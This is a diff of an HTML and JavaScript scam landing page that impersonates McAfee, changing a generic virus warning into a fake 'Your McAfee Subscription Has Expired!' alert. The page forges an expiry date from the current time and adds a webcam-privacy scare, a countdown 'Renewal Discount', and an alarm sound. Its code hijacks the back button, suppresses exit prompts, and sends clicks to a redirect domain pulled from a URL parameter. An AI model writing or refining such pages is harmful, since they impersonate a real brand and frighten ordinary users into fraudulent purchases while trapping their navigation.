@@ -237,12 +237,9 @@ return decodeURI(
 <div class="main-wrapper" id="wraper">
 <div class="header"><img src="./assets/m_logo.png"></div>
 <div class="wrapper">
-<h2 class="black" id="txt1">Your PC may be vulnerable to viruses!</h2>
-<p><span class="black" id="txt2">McAfee Antivirus protects your family from viruses, spyware, malware botnets and more.  Scanned:</span>
-<strong>
-
-
-<script language="Javascript">
+<h2 class="black" id="txt1">Your McAfee Subscription Has Expired!</h2>
+<p><span class="black" id="txt2">Your subscription of McAfee Total Protection has expired on </span>
+<strong><script language="Javascript">
 var alerttext1 = "System Warning: Your";
 var device_name =  getURLParameter('device_brand'); 
 var alerttext2 = "May Be At Risk";
@@ -306,23 +303,20 @@ if (lang == 'se') {
 var now = new Date(Date.now() - 90*60*60*1000);
 document.write(monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear());
 </script></strong>.</p>
-<p><span id="txt3">if your computer isn't protected by McAfee's advanced threat prevention, you might be at risk.</span> <b id="txt3a"></b></p>
+<p><span id="txt3">After the expiration date, your computer will become susceptible to many different virus threats.</span> <b id="txt3a">Your webcam privacy is at risk.</b></p>
 <h4 class="black" style="color:orange"><span id="txt4">Your computer is unprotected, exposing it to viruses and other malware...</span></h4>
 <ul>
-<li><font color="green" id="txt5">Available</font> (<font color="red"><strong>-75%</strong></font>) <span id="txt6">Discount</span>: <span id="theTime" style="color:red;"></span>
+<li><font color="green" id="txt5">Available</font> (<font color="red"><strong>-55%</strong></font>) <span id="txt6">Renewal Discount</span>: <span id="theTime" style="color:red;"></span>
 <span style="color:red; font-weight:bold;">
 <script language="Javascript">
 	var now = new Date(Date.now());
 	document.write(monthNames[now.getMonth()] + " " +
 	 now.getDate() + ", " + now.getFullYear());
 	</script>
-	
-
-	
 </span>
 </li></ul>
-<span style="text-align:center;display:block;"><img id="img-prod" src="./assets/mcafee.jpg"></span>
-<a href="https://bin.surpriseanddelightgifts.com/cool.php?lp=1"><div class="button"><span id="txt7">Stay Protected</span></div></a>
+<span style="text-align:center;display:block;"><img id="img-prod" src="./assets/product_serial.png"></span>
+<a href="javascript:void(0)" onclick="out();PreventExitPop=false" rel="noreferrer" target="_blank" class="offer-button pulse"><div class="button"><span id="txt7">Renew Subscription</span></div></a>
 </div>
 </div>
 <script type="text/javascript">
@@ -341,7 +335,7 @@ document.write(monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.get
 	 
 //if use addressbar then outbound link will be like this
 var url_parameter = getURLParameter("domain");
-function out(){window.onbeforeunload=null,window.location="https://bin.surpriseanddelightgifts.com/cool.php?lp=1"}
+function out(){window.onbeforeunload=null,window.location="https://"+url_parameter+"/index.php?lp=1&to_offer=1&place=cta"}
 	 
 //backbutton to keep current page
 ! function () {
@@ -365,7 +359,7 @@ audio.play();
 		document.getElementById('txt3a').innerHTML = 'Your webcam privacy is at risk.';
 		document.getElementById('txt4').innerHTML = 'Your computer is unprotected, exposing it to viruses and other malware...';
 		document.getElementById('txt5').innerHTML = '' +isp+ '';
-		document.getElementById('txt6').innerHTML = 'Discount';
+		document.getElementById('txt6').innerHTML = 'Renewal Discount';
 		document.getElementById('txt7').innerHTML = '✔️ Renew Subscription Now';
   }
   
